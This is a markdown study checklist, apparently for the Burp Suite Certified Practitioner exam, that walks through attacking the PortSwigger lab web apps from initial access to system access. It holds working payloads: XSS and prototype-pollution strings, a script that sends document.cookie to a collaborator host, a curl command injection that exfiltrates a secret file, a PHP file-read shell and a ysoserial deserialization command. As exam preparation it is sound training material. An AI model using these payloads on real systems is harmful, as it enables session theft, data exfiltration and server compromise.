# Table of Contents
1. [Initial Access](#initial-access)
2. [Privilege Escalation](#privilege-escalation)
3. [System Access](#system-access)
4. [User Intervention Table](#user-intervention-table)


# Initial Access

**Overall Notes to Remember**

- Check for WebSockets - if there, look at WebSockets lab
- If webcache poisoning, can use `Origin` header as a cache buster
    - If you see `X-Cache`, try this header in the request `Pragma: x-get-cache-key`
- If blog posting is allowed, see HTTP Request Smuggling (XSS too obviously)
- Check the trackingid cookie for SQL
- Graphql Endpoints
    - ```
      /graphql
      /api
      /api/graphql
      /graphql/api
      /graphql/graphql
      ```
- Session tokens can be manually put into the application storage
  
**Do before anything else:**
- scan all found parameters
- Crawl
- Discover Content (although they say nothing will be hidden...so might not be be necessary)
- Check robots.txt
- Check Host header bypass `Host: localhost`
    - other host override headers:
        -   `X-Host`
        -   `X-Forwarded-Server`
        -   `X-HTTP-Host-Override`
         -  `Forwarded`

## Home page

- Param Miner headers on home page.
- (If responses have `x-cache` headers) Check for `/resources/js/tracking.js` and if it is being dynamically updated from the `X-Forwarded-Host` header or the `X-Host` - indicates "Web cache poisoning with an unkeyed header" or "Targeted web cache poisoning using an unknown header" respectively. 
    - Might need to add `X-Forwarded-Scheme` header too. Set to `nothttps` (anything other than `HTTPS`). See *"Web cache poisoning with multiple headers"*
    - Check for `Vary` in response and if its tied to the `User-Agent` *(more so when trying to identify the victim's browser, but the exam tells you its chrome)*
    - Check if page still caches when including arbitrary parameters: `/?evil='/><script>alert(1)</script>`
    - Try adding two `Host` headers, one being the exploit server (might reflect into something like `/resources/js/tracking.js`) *from: Web cache poisoning via ambiguous requests*
        -  Try full URL in GET - if supported, then try changing Host header to collab. 
        - Learning materials also say try an @ sign in the beginning `GET @private-intranet/example HTTP/1.1`
    - See if any interesting cookies are set when hitting the homepage. If so, see *"Web cache poisoning with an unkeyed cookie"*
    - Check for other js files under `/js/` i.e. `/js/geolocate.js`
    - Test if non-existent paths are reflected in the response: `GET /random</p><script>alert(1)</script><p>foo` - This can poison cache even if reflected in your but not executed in original poisoned response. From *"URL normalization"*
- Check if app is HTTP/2 (if so, see H2 HTTP Request Smuggling labs)
- Check for any serialized cookies 
- Check for `/.git`. *From: Information disclosure in version control history*
- Try the prototype pollution vectors as a query string:
    - `/?__proto__[foo]=bar`
    - `/?__proto__.foo=bar`
    - If either work turn on DOM invader and it will find a proof of concept
    - If neither work, try inserting a dulpicate of the word to get around sanitization:
        - ```
            /?__pro__proto__to__[foo]=bar
            /?__pro__proto__to__.foo=bar
            /?constconstructorructor[protoprototypetype][foo]=bar
            /?constconstructorructor.protoprototypetype.foo=bar
          ```
        - Then follow the manual solution in `Lab: Client-side prototype pollution via flawed sanitization`
    - It might be useful to run DOM invader if stuck

## My Account

- Username enumeration 
    - test just username, see if there are "subtly different responses"
    - test with "response timing". Set password to 100+ characters (`L3QwfBQ42SX25oRNSTVUTtQvJ1o7C86eLe0TSgIvVeyww0TX2kLmcdoX4wiI9mHraCECaDGwc9a3ERG096pk9nOQcfjIeO7aAjtm`) and brute force usernames. See if any usernames have a slower response. 
    - Test via "account lock": Put dummy username and password as base request. **Cluster bomb**. Add username list to intruder. Add two $ to the end of password `password=test§§`. Set that one to **null** payloads with **5** (maybe more?) generated. If successful, should get a response of too many incorrect passwords. 
- Account Brute force
    - If valid username found with methods above, brute force the password.
    - Else Cluster bomb all usernames and passwords
- Check to see if info comes from or goes to GraphQL endpoint

## Password reset

- Send a POST request to forgot password with the username carlos (or another username if identified from above). Intercept and include the header `X-Forwarded-Host` pointing to collab. See if collab gets a hit with the URL including the token. 
    - Do the same as above but with the `Host` header as the collab server (try this for getting carlos and admin, as only the token might be disclosed, not the url path needed for the password reset) *From: Basic password reset poisoning*
- See if you can truncate the request with %23 (#) `API testing`

## Admin panel 

- Check for messages that a certain user group has access, i.e. `DontWannaCry`
- Change host header to `localhost` to bypass authentication to `/admin` (more likely for after initial access is done)

## Advanced search
(If even visible)

- Check similar bypass methods as the `/admin` panel.

## Search Bar

- XSS `searchterm=test%27%0a<body%20onload=print()>`
- Scan the `searchterm` (or whatever it may be) parameter.

## View Blog Post

- Scan `postId` (or whatever it may be) parameter, i.e. `/post?postId=1`
- See if you can post comments
- Check to see if posts come from GraphQL endpoint



---

# Privilege Escalation

**Overall Notes to Remember**

- Check for TrackingId cookies - SQLi labs
- See if there are pages you have access to now that you didnt before that an admin user might be visiting. Could do XSS (if xss exists) to CSRF to change the admin's email. *From: "Exploiting XSS to perform CSRF"*
- If there is an encrypted `stay-logged-in` cookie, see *Authentication bypass via encryption oracle*
- When gotten carlos's account, change email to the attacker's email provided. Try the same password reset poisoning methods from above (under password reset) by including the `X-Forwarded-Host` or changing the `Host` headers.
- OAUTH recon endpoints
    - ```
      /.well-known/oauth-authorization-server
      /.well-known/openid-configuration
      ```

## Admin Panel

- Change host header to `localhost` to bypass authentication to `/admin`
- Request `/` with the header `X-Original-URL` set to `/admin`
- If all else fails, see the HTTP Request Smuggling labs. They are generally are used to access `/admin`. 

## My Account

- Check if after authentication any other cookies are added. See if they are serialized. 
- Check the update email feature response for roleID information. 
    - Or see if there's a `/role-selector` follow-up request after authetnicating like from *Authentication bypass via flawed state machine*
    - See if you can change the information to admin and affect admin's data (username, email, password, etc.)
- Check for XSS in parameters for the change email feature. *From: Reflected XSS protected by CSP, with dangling markup attack*
    - That lab was more so if you can input the email value into the field via the URL, i.e. `https://your-lab-id.web-security-academy.net/my-account?email=test@test.com`. If it autofills, can use this exploit server xss code: `<script> location='https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?'; </script>`. This can get their CSRF token.
- Check the update email request for csrf tokens. Change request method to GET and see if token is still required. Could CSRF the admin. 
    - Also test if the csrf token is even required in POST or GET requests. 
    - If csrf tokens are changing every time, they may be one-time-use and not tied to user session. Grab an unused csrf token (drop a valid request) and put that in the csrf poc for the exploit server. 
    - If csrf token is in cookie and body, see "CSRF where token is duplicated in cookie"
    - Edit the Referer header in the update email request to see if it's rejected. If so, remove it completely to see if it is accepted. If so, generate CSRF POC and include `<head><meta name="referrer" content="no-referrer"></head>` before the body
    - If all else false, see "CSRF with broken Referer validation"
- Check for CORS headers, i.e. `Access-Control-Allow-Credentials`
    - If so, include/change the origin header and see if reflected in the CORS header. If so *see "CORS vulnerability with basic origin reflection"*
    - See if null origin is allowed (more useful if sensitive useful data is included in the `/accountDetails` page.) *See "CORS vulnerability with trusted null origin"*
    - See "CORS vulnerability with trusted insecure protocols" If XSS and CORS are present 
- If a change password feature exists, see if `current-password` is even required. If not, change username to administrator.
    - See if the password change request has a username field. Try to put in `administrator`. Check for behavior similar to "Password brute-force via password change"
    - If the `temp-forgot-password-token` shows up in both URL and request body, see if removing them is still accepted by the server (only really matters if you can edit the `username` field too)
- See if you have to sign in with social media `OAUTH`
    - See if you can change the information sent in the `/authenticate` request
    - See if there is a registration endpoint
    - Check for an `/oauth-linking` endpoint
    - Check the redirect-uri to see if it allows path traversal or arbitrary values
- Look for JWTs
    - Check to see if you can just edit the items
    - Check for RS256 or HS256
        - RS256
            - Check for JWK header injection
            - Try adding a JKU header
        - HS256
            - Check for no signature
            - Attempt to brute force key
            - Try to use kid path traversal with`/dev/null` and a empty key
- If you can change user info,
    - Fuzz for prototype pollution by using `"__proto__": { "status":555 }`  or `"constructor": { "prototype": { "json spaces":10 } }` as a parameter
        - To see the JSON spaces you must be in the RAW view
    - Check for GraphQL enpoints
- Check for race condition see `Lab: Bypassing rate limits via race conditions`, `Lab: Single-endpoint race conditions`, `Lab: Exploiting time-sensitive vulnerabilities`
- Fuzz for NoSQL injection
- Check for /api

## Advanced Search
- Insertion point scan any parameters and forms. (SQLi from practice exam)
- Check for parameters likely vulnerable to ssrf (params with urls in them) i.e. `stockApi`, `path` from SSRF labs.

## Blog posts

- See if anything is different here after authetnication
    - Can you post comments now? Try XSS:  `<script>  
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {  
    method: 'POST',  
    mode: 'no-cors',  
    body:document.cookie  
    });  
    </script>` 



---

# System Access

**Overall Notes to Remember**
- Again, check for anything you didn't have access (admin panel the obvious one)

## Admin Panel
- If file uploads, check for webshell upload, XXE via file upload
    - remember file upload doesnt need fully interactive webshell, this will work just fine: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Check if admin gets a new cookie like in the practice exam: `admin-prefs`. Check if its serialized. 
    - basic ysoserial syntax: `java -jar /home/thegetch/pentest/ysoserial.jar CommonsCollections4 'cat /home/carlos/secret' | base64` (base64 optional but likely the cookie is b64ed or encoded in some way for http requests to work)
- Insertion point scan any and all new parameters
    - XXE, SSTI, Command Injection, Directory Traversal mainly, potentially SQLi. Perhaps SSRF to that internal host they say is listening (localhost on port 6566)
        - SSTI fuzz string: `${{<%[%'"}}%\`
- See if any JSON data is being sent
    - Check for prototype pollution with `"__proto__": { "json spaces":10 }` or `"constructor": { "prototype": { "json spaces":10 } }`
        -Command injection: `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl -X POST <your-collaborator> -d @/home/carlos/secret')" ] }`

---

# User Intervention Table

**The labs that require an active user vs the ones that don't.**

## Initial Access

| Requires user intervention | Does not require user intervention |
| :--- | :--- |
| [Cross-Site Scripting (XSS)](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#cross-site-scripting-xss) | [SQL Injection](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#sql-injection) |
| [DOM-based Vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#dom-based-vulnerabilities) | [Authentication](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#authentication) |
| [WebSockets](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#websockets) | [Business logic vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#business-logic-vulnerabilities)|
| [Web Cache Poisoning](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#web-cache-poisoning) | [Insecure deserialization](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#insecure-deserialization) |
| [HTTP Host header attacks](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-host-header-attacks) | [HTTP Host header attacks](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-host-header-attacks) |
| [HTTP Request Smuggling](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-request-smuggling) | [GraphQL API vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#graphql-api-vulnerabilities) |
| [Prototype pollution](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#prototype-pollution) | [NoSQL injection](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#nosql-injection) |
| | [API testing](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#api-testing) |


## Privilege Escalation

| Requires user intervention | Does not require user intervention |
| :--- | :--- |
| [Cross-Site Scripting (XSS)](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#cross-site-scripting-xss) | [SQL Injection](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#sql-injection) |
| [DOM-based Vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#dom-based-vulnerabilities) | [Authentication](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#authentication) |
| [WebSockets](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#websockets) | [Business logic vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#business-logic-vulnerabilities)|
| [Web Cache Poisoning](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#web-cache-poisoning) | [Insecure deserialization](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#insecure-deserialization) |
| [HTTP Host header attacks](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-host-header-attacks) | [HTTP Host header attacks](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-host-header-attacks) |
| [HTTP Request Smuggling](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#http-request-smuggling) | [GraphQL API vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#graphql-api-vulnerabilities) |
| [Prototype pollution](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#prototype-pollution) | [NoSQL injection](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#nosql-injection) |
| [Cross-Site Request Forgery (CSRF)](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#cross-site-request-forgery-csrf) | [API testing](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#api-testing) |
| [Cross-origin resource sharing (CORS)](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#cross-origin-resource-sharing-cors) | [Server-side Request Forgery (SSRF)](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#server-side-request-forgery-ssrf) |
| [Essential Skills](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#essential-skills) | [Access Control Vulnerabilities](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#access-control-vulnerabilities) |
| | [Information disclosure](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#information-disclosure) |
| | [OAuth authentication](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#oauth-authentication) |
| | [JWT](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#jwt) |
| | [Race Conditions](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/Lab%20Solutions%20by%20Type.md#race-conditions) |

---
